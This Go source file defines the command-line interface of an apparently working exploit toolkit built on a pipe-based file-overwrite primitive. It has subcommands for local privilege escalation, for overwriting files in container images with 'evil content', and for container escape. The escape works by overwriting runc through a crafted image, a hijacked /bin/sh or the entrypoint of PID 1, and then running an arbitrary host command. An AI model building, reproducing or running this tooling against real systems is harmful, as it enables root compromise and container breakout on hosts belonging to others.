package pipeprimitive

import (
	"context"
	"fmt"

	"github.com/urfave/cli/v3"
)

func Command(primitive Primitive, aliases []string, usage string) *cli.Command {
	return &cli.Command{
		Name:    primitive.GetExpName(),
		Aliases: aliases,
		Usage:   usage,
		Commands: []*cli.Command{
			{
				Name:    escalateName(primitive),
				Aliases: []string{"p"},
				Usage:   fmt.Sprintf("local privilege escalate by using %s", primitive.GetExpName()),
				Action: func(ctx context.Context, cmd *cli.Command) error {
					return Escalate(primitive)
				},
			},
			{
				Name:    imagePollutionName(primitive),
				Aliases: []string{"i"},
				Usage:   fmt.Sprintf("image pollution using %s", primitive.GetExpName()),
				Flags: []cli.Flag{
					&cli.StringFlag{Name: "source", Aliases: []string{"s"}, Required: true,
						Usage: "the path of file with evil content"},
					&cli.StringFlag{Name: "destination", Aliases: []string{"d"}, Required: true,
						Usage: "the path of file you want to pollute"},
				},
				Action: func(ctx context.Context, cmd *cli.Command) error {
					return ImagePollution(primitive, cmd.String("source"), cmd.String("destination"))
				},
			},
			{
				Name:    escapeName(primitive),
				Aliases: []string{"e"},
				Usage:   fmt.Sprintf("container escape by using %s", primitive.GetExpName()),
				Commands: []*cli.Command{
					{
						Name:  "image",
						Usage: "generate a runc overwrite escape image",
						Flags: []cli.Flag{
							&cli.StringFlag{Name: "dir", Aliases: []string{"d"},
								Value: fmt.Sprintf("poc-%s-escape", primitive.GetExpName()),
								Usage: "the directory to create the PoC image files"},
							&cli.StringFlag{Name: "cmd", Aliases: []string{"c"}, Required: true,
								Usage: "host command to execute after runc is overwritten"},
							&cli.StringFlag{Name: "mode",
								Value: EscapeImageModeStart,
								Usage: "escape image `start|exec` mode: start captures runc start with a fake loader; exec captures runc exec triggered by HEALTHCHECK",
								Validator: func(mode string) error {
									return ValidateEscapeImageMode(mode)
								}},
						},
						Action: func(ctx context.Context, cmd *cli.Command) error {
							provider, ok := primitive.(EscapeImageWriterProvider)
							if !ok {
								return fmt.Errorf("%s does not provide an escape image writer", primitive.GetExpName())
							}
							var extraFiles map[string][]byte
							if provider, ok := primitive.(EscapeImageExtraFileProvider); ok {
								extraFiles = provider.EscapeImageExtraFiles()
							}
							return GenerateEscapeImageWithMode(cmd.String("dir"), cmd.String("mode"), provider.EscapeImageWriter(), ShellPayload(cmd.String("cmd")), extraFiles)
						},
					},
					{
						Name:  "exec",
						Usage: "overwrite an exec target and wait for docker exec to capture runc",
						Flags: []cli.Flag{
							&cli.StringFlag{Name: "target", Aliases: []string{"t"},
								Value: "/bin/sh",
								Usage: "container executable to overwrite with #!/proc/self/exe"},
							&cli.StringFlag{Name: "cmd", Aliases: []string{"c"}, Required: true,
								Usage: "host command to execute after runc is overwritten"},
							&cli.DurationFlag{Name: "timeout",
								Usage: "timeout for waiting to capture runc; 0 means wait forever"},
						},
						Action: func(ctx context.Context, cmd *cli.Command) error {
							return EscapeExec(primitive, cmd.String("target"), ShellPayload(cmd.String("cmd")), cmd.Duration("timeout"))
						},
					},
					{
						Name:  "restart",
						Usage: "overwrite the running entrypoint and trigger a container restart to capture runc",
						Flags: []cli.Flag{
							&cli.IntFlag{Name: "pid",
								Value: 1,
								Usage: "pid whose executable should be overwritten and killed"},
							&cli.StringFlag{Name: "cmd", Aliases: []string{"c"}, Required: true,
								Usage: "host command to execute after runc is overwritten"},
							&cli.DurationFlag{Name: "timeout",
								Usage: "timeout for waiting to capture runc; 0 means wait forever"},
						},
						Action: func(ctx context.Context, cmd *cli.Command) error {
							return EscapeRestart(primitive, cmd.Int("pid"), ShellPayload(cmd.String("cmd")), cmd.Duration("timeout"))
						},
					},
				},
			},
		},
	}
}
